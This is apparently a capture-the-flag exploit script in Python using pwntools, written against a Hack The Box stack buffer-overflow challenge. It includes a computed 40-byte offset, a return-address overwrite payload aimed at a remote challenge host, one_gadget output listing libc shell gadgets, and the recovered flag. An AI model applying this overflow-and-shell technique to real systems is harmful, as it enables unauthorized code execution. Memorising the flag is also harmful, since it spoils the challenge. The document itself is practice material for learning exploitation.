'''
cyclic 1024
*RBP  0x6161616a61616169 ('iaaajaaa')
cyclic -l jaaa
36
36+4 = 40
'''

#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

elf = ELF('./main')
libc = ELF('./glibc/libc.so.6')

ip, port = "94.237.48.248", 56378
io = remote(ip, port)
#io = process('./main')

padding = b'A'*40
address = p64(0x004011d6)
payload = padding + address
#0x00000000004011bc : add dword ptr [rbp - 0x3d], ebx ; nop ; ret

'''
./glibc/libc.so.6
0x50a37 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
  rbp == NULL || (u16)[rbp] == NULL

0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xebcf5 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0xebcf8 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

'''

#io.recvuntil(b'Enter your name:')
#io.sendline(payload)
#print(io.recvall())

'''
It is a questionnaire!

HTB{pwn_101_w1th_s0m3_b0f}
'''
